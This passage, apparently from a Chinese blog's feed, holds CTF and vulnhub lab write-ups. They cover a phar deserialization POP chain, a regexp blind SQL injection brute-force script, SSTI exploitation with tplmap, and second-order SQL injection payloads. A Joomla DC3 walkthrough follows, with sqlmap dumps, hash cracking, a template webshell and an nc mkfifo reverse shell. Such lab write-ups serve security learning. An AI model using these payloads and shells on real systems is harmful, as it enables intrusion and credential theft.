class="variable">$b</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">C1e4r</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;str=<span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>(); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230710205332097.png" alt="image-20230710205332097"></p><p>是由这个函数来触发的  </p><p><strong>构造POP链地思路</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">通过Cle4r。将str赋值为Show类。</span><br><span class="line">this-&gt;test=<span class="variable language_">$this</span>-&gt;Show类</span><br><span class="line"><span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">触发Show类中的__tostring魔术方法。进入Show类。执行</span><br><span class="line"><span class="variable">$content</span>=<span class="variable language_">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">那么我们将str[<span class="string">&#x27;str&#x27;</span>]赋值为Test类。使其调用source。但是不存在。</span><br><span class="line">接下来就进入了Test类。执行</span><br><span class="line"><span class="title function_ invoke__">__get</span>(<span class="variable">$key</span>)。这个<span class="variable">$key</span>。其实就是source。</span><br><span class="line"><span class="title function_ invoke__">get</span>(<span class="variable">$key</span>)</span><br><span class="line"><span class="variable">$value</span>=this-&gt;params[<span class="string">&#x27;source&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$value</span>);</span><br><span class="line">由于Test类在构造函数中。定义了params是个数组。那么我们就定义params=<span class="keyword">array</span>(<span class="string">&#x27;source&#x27;</span>=&gt;<span class="string">&#x27;/var/www/html/fl1g.php&#x27;</span>);</span><br></pre></td></tr></table></figure><ul><li><strong>第二步上传phar文件</strong></li></ul><p><img src="../images/image-20230710205852012.png" alt="image-20230710205852012"></p><p><strong>因为只允许上传这几种后缀的文件  所以说我们得修改<code>phar.phar</code>为<code>1.jpg</code>来上传</strong></p><p><img src="../images/image-20230710210025688.png" alt="image-20230710210025688"></p><p>这就是为什么上传jpg的原因  这里的上传路径是可以自己查出来的</p><p><strong>md5(文件名加ip地址就行了)</strong></p><p><img src="../images/image-20230710210409432.png" alt="image-20230710210409432"></p><h2 id="NCTF2019-SQLi"><a href="#NCTF2019-SQLi" class="headerlink" title="[NCTF2019]SQLi"></a>[NCTF2019]SQLi</h2><p>这个题考察的是<strong>正则注入</strong>(regexp注入)</p><p><img src="../images/image-20230710212212947.png" alt="image-20230710212212947"></p><p>扫一下目录发现存在 <strong>robots.txt</strong></p><p><img src="../images/image-20230710212239616.png" alt="image-20230710212239616"></p><p>存在<strong>hint.txt</strong></p><p><img src="../images/image-20230710212316112.png" alt="image-20230710212316112"></p><p>过滤了挺多东西的 </p><p>这个注入方式呢相当于<strong>布尔盲注</strong>吧，若是猜对了就返回正确的页面，我们本地测试一下正则，先看一下全部数据，然后^匹配e开头的password</p><p>  <img src="../images/image-20230710212618723.png" alt="image-20230710212618723"></p><p>就是使用这种办法</p><p><strong>回到题目</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> passwd<span class="operator">=</span><span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>想要猜解admin的密码需要用到admin，可是题目过滤掉了admin，但是我们能用其他方法绕过，让username=\，将语句后面的单引号给转义掉，我们可以构造这样的payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span>\<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="operator">||</span><span class="keyword">sql</span>;<span class="operator">%</span><span class="number">00</span></span><br></pre></td></tr></table></figure><p>这里其实就是在注释符不存在的情况下使用的一种<strong>闭合引号</strong>的方法来替代</p><p>放入原查询语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;\&#x27;</span> <span class="keyword">and</span> passwd<span class="operator">=</span><span class="string">&#x27;||sql;%00&#x27;</span></span><br></pre></td></tr></table></figure><p>这里sql的意思是可以添加sql语句来进行查询</p><p><strong>脚本查询</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># buuctf web [NCTF2019]SQLi</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://9cfe7d12-7a56-4e34-ab59-9c8f6657012a.node4.buuoj.cn:81/&quot;</span></span><br><span class="line">pw_fuzz = string.ascii_lowercase + string.digits + <span class="string">&quot;_&quot;</span>  <span class="comment"># 密码字典：小写字母和数字还有下划线</span></span><br><span class="line">pw = <span class="string">&quot;&quot;</span>  <span class="comment"># admin的密码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> pw_fuzz:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;\\&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;passwd&#x27;</span>: <span class="string">&#x27;||/**/passwd/**/regexp/**/&quot;^&#123;&#125;&quot;;\x00&#x27;</span>.<span class="built_in">format</span>((pw + i))</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url=url, data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;alert&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">            pw = pw + i</span><br><span class="line">            <span class="built_in">print</span>(pw)</span><br><span class="line">            time.sleep(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>最后爆破出来的密码是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">you_will_never_know7788990</span><br></pre></td></tr></table></figure><p>登录之后就拿到了flag</p><p><img src="../images/image-20230710213827300.png" alt="image-20230710213827300"></p><h2 id="RootersCTF2019-I-lt-3-Flask"><a href="#RootersCTF2019-I-lt-3-Flask" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h2><p><strong>这个有个解法是使用工具来解的  (当然手注也行)</strong></p><p>不过是可以学习一下工具解法</p><ol><li><strong>Jinjia2模版注入</strong></li><li><strong>Arjun</strong>参数爆破工具</li><li><strong>tplmap</strong>模版注入工具</li></ol><h3 id="Arjun工具"><a href="#Arjun工具" class="headerlink" title="Arjun工具"></a>Arjun工具</h3><p><img src="../images/image-20230710215323301.png" alt="image-20230710215323301"></p><p><strong>安装过程</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install arjun</span><br></pre></td></tr></table></figure><p>等会就会把<code>name</code>这个参数给爆出来</p><h3 id="tplmap工具"><a href="#tplmap工具" class="headerlink" title="tplmap工具"></a>tplmap工具</h3><p>这个工具的话就会把是什么模板注入也给爆出来</p><p><a href="https://github.com/epinna/tplmap">tplmap工具地址</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 tplmap.py -u &#x27;http://462f5dc9-0fae-4d3a-b764-a9b0b0c8a125.node4.buuoj.cn:81/?name=1&#x27;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230710220009967.png" alt="image-20230710220009967"></p><p><strong>然后使用<code>--os-shell</code>就行了</strong></p><p><img src="../images/image-20230710220352594.png" alt="image-20230710220352594"></p><p><strong>学到了   居然还可以使用工具来写入shell和判断ssti的类型</strong></p><h2 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h2><p><strong>考点</strong></p><ul><li>git泄露</li><li>sql二次注入</li><li>sql文件读取</li><li>特殊文件识别和利用</li></ul><p>先扫目录发现 <code>.git</code>存在   </p><p>使用<code>Githack</code>来下载git泄露文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] != <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到泄露的源码</p><p><strong>(使用这个工具得到的源码不全   所以我们得使用<a href="https://github.com/WangYihang/GitHacker">githacker</a>这个工具)</strong></p><p><img src="../images/image-20230711162435027.png" alt="image-20230711162435027"></p><p>发现这个工具的话 将一些东西与<code>write_do.php</code>进行了混合   于是尝试读取这个文件</p><p><img src="../images/image-20230711163207250.png" alt="image-20230711163207250"></p><p>第一步  先获取这个<code>commit</code>  </p><p> 然后提示了这个<code>e5b2a24</code>这个新内容的位置  </p><p><code>git show e5b2a24</code>    来进行读取这个内容</p><p><img src="../images/image-20230711163542762.png" alt="image-20230711163542762"></p><p>这些带颜色的内容就是新增加的    于是和刚开始获取的代码结合在一起</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] != <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">    <span class="variable">$category</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;category&#x27;</span>]);</span><br><span class="line">    <span class="variable">$title</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into board</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                title = &#x27;<span class="subst">$title</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">    <span class="variable">$bo_id</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;bo_id&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select category from board where id=&#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$num</span> = <span class="title function_ invoke__">mysql_num_rows</span>(<span class="variable">$result</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$category</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>)[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./comment.php?id=<span class="subst">$bo_id</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230711164017476.png" alt="image-20230711164017476"></p><p>审计代码发现这里存在很明显的二次注入  并且就是这里的话过滤的话只采用一个<code>addslashes</code>转义函数来进行过滤</p><p>就是再<code>write</code>的时候控制这个<code>category</code>的内容  然后在插入<code>comment</code>的时候就会将我们的恶意代码输出的结果给插入进去  然后我们访问<code>comment</code>的时候就能看到结果了</p><p>先尝试进行登录</p><p><img src="../images/image-20230711164252502.png" alt="image-20230711164252502"></p><p>这里的星号就是让我们进行爆破的</p><p><img src="../images/image-20230711164519704.png" alt="image-20230711164519704"></p><p>bp进行爆破</p><p><img src="../images/image-20230711164923916.png" alt="image-20230711164923916"></p><p>得出结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">密码为 ： zhangwei666</span><br></pre></td></tr></table></figure><p><strong>这里的二次注入表现为，addslashes过滤后产生的\不会进入数据库，即’1过滤后变成<code>\&#39;1</code>，进入库中却仍为’1，我们在取出数据后进行二次拼接，即可造成注入</strong></p><p><strong>第一步</strong></p><p>在<code>wirte</code>处对<code>category</code>写入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;, content=user(),/*</span></span><br></pre></td></tr></table></figure><p>在<code>comment</code>处写入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">*</span><span class="operator">/</span>#</span><br></pre></td></tr></table></figure><p>最后表现的形式是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;insert into comment</span><br><span class="line">            set category = &#x27;&#x27;, content=user(),/*  </span><br><span class="line">                content = &#x27;*/#&#x27;,</span><br><span class="line">                bo_id = &#x27;$bo_id&#x27;&quot;;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230711171235711.png" alt="image-20230711171235711"></p><p>这里直接按照wp给的<code>flag</code>位置来进行读取了(<strong>这里是藏flag的  没意思</strong>)</p><p><strong>write处</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;, content=(load_file(&#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span>flag_8946e1ff1ee3e40f.php<span class="string">&#x27;)),/*</span></span><br></pre></td></tr></table></figure><p><strong>comment处</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">*</span><span class="operator">/</span>#</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> buuctf 刷题记录 第三页 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub DC3</title>
      <link href="/posts/a127ea96.html"/>
      <url>/posts/a127ea96.html</url>
      
        <content type="html"><![CDATA[<p>考点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">总结：joomscan工具的使用，cve-2016-4557内核提权或者cve-2021-4034内核提权</span><br></pre></td></tr></table></figure><p>现扫一下看开放了哪些端口</p><p><img src="../images/image-20230410221753236.png" alt="image-20230410221753236"></p><p>只开放了一个80端口</p><p>看起来像是个网页，然后进行访问</p><p><img src="../images/image-20230410221926196.png" alt="image-20230410221926196"></p><p>发现这是一个cms框架</p><p>于是就用到了这个工具来查看这个网站是否存在漏洞</p><p><strong>Joomla!</strong>是一套全球知名的内容管理系统，Joomla!是使用PHP语言加上MySQL数据库所开发的软件系统。</p><p><strong>这里需要使用一个工具joomscan 因为最新kali没有 又去装了一下又学习了一下。</strong></p><p>（JoomScan）：是一个开源项目，旨在自动执行Joomla CMS部署中的漏洞检测和可靠性保证任务。该工具在Perl中实现，可以无缝轻松地扫描Joomla安装，同时通过其轻量级和模块化架构留下最小的占地面积。它不仅可以检测已知的攻击性漏洞，还能够检测到许多错误配置和管理员级别的缺陷，这些缺陷可被攻击者利用来破坏系统。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/rezasp/joomscan.git </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd joomscan</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl joomscan.pl</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230410223514173.png" alt="image-20230410223514173"></p><p>一些最基本的参数 使用命令：<code>perl joomscan.pl --url 192.168.142.130</code></p><p><img src="../images/image-20230410223612886.png" alt="image-20230410223612886"></p><p>发现漏洞</p><p>通过上面的 探测我们可以知道<code>Joomla</code> 的版本 <code>3.7.0</code> 以及CMS的后台地址<code>/administrator/</code> (说明工具还是强大的，爆赞👍)并且还没开防火墙</p><p>这里知道版本号就尝试查找这个版本的漏洞</p><p><a href="https://xz.aliyun.com/t/2860">记一次在实战靶机中使用SearchSploit的总结</a></p><p>就是利用这个工具来进行查找(kali自带)</p><p>msf也能查询到，但是不知道能不能进行利用</p><p><img src="../images/image-20230410224100325.png" alt="image-20230410224100325"></p><p>存在sql注入 </p><p>那么我们就进行漏洞利用   <strong>后面的path有利用方法</strong></p><p> 那么我们就进行访问那个方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/php/webapps/42033.txt j.txt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230410224524420.png" alt="image-20230410224524420"></p><p>就直接用sqlmap来打</p><p><img src="../images/image-20230410224900307.png" alt="image-20230410224900307"></p><p><strong>查询到好几个数据库</strong></p><p><strong>接下来就是查找当前网站用的数据库是哪个</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.142.130/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --current-db -p list[fullordering]</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230410225107342.png" alt="image-20230410225107342"></p><p><strong>接下来就是查表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.142.130/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; --tables  -p list[fullordering]  </span><br></pre></td></tr></table></figure><p><img src="../images/image-20230410225206881.png" alt="image-20230410225206881"></p><p>查出来一堆表</p><p>这里的话就注重查询<strong>#__users</strong></p><p>注入查询<strong>#__users</strong>表 发现有6列 知道列了就可以进行下一步字段的操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.142.130/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; -T &quot;#__users&quot; --columns  -p list[fullordering]</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230410225524368.png" alt="image-20230410225524368"></p><p>发现存在用户名和密码</p><p>然后进行查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap  -u &quot;http://192.168.142.130/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; -T &quot;#__users&quot; -C &quot;name,password&quot; --dump  -p list[fullordering]</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230410225648646.png" alt="image-20230410225648646"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username：admin</span><br><span class="line">password：$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</span><br></pre></td></tr></table></figure><p>发现密码进行了加密(还是使用之前用的<strong>john</strong>进行破解)</p><p><img src="../images/image-20230410225935194.png" alt="image-20230410225935194"></p><p>爆破出密码 ——-&gt;  <code>snoopy</code></p><p>然后根据之前查出来的后台登录就行</p><p><img src="../images/image-20230410230119518.png" alt="image-20230410230119518"></p><p><img src="../images/image-20230410230145831.png" alt="image-20230410230145831"></p><p>登录成功</p><p>成功登录进去后，我们开始寻找可以利用的点，最终我们在templates下面找到一个可以创建文件并且可以写文件的地方。于是，尝试写入一句话木马</p><p><img src="../images/image-20230410231044168.png" alt="image-20230410231044168"></p><p>这里就是一个漏洞利用点</p><p><img src="../images/image-20230410231254633.png" alt="image-20230410231254633"></p><p>写进来后我们就得去找上传地址了</p><p><img src="../images/image-20230410231346635.png" alt="image-20230410231346635"></p><p>根据这两条猜出来的结论</p><p><img src="../images/image-20230410231557812.png" alt="image-20230410231557812"></p><p>成功执行，代表上传成功</p><p><img src="../images/image-20230411085918600.png" alt="image-20230411085918600"></p><p>成功连上蚁剑</p><p><img src="../images/image-20230411090020317.png" alt="image-20230411090020317"></p><p>查看虚拟终端发现不是root权限，所以我们就尝试一下进行提权</p><p>尝试了一圈发现suid和sudo用不了来进行提权，那么我们就得尝试别的方法了</p><p><strong>这里话蚁剑不适合提权，也不好进行操作</strong>，我们就尝试弹个shell回到本机</p><p>（首先需要明确，不能使用蚁剑提权，因为HTTP是瞬时协议，我这边正提权呢，你那边TCP四次挥手断开连接了，不能持久连接，所以蚁剑的作用就在于上传文件来反弹shell。)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.142.129 4444 &gt;/tmp/f</span><br></pre></td></tr></table></figure><p>这个是php的反弹shell操作</p><p><img src="../images/image-20230411090508994.png" alt="image-20230411090508994"></p><p>反弹shell成功</p><p>接下来整一个python交互的shell好进行操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230411090616944.png" alt="image-20230411090616944"></p><p>设置成功</p><p>这里由于前两个点提权不成功，那么我们就尝试进行内核提权</p><h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><p><a 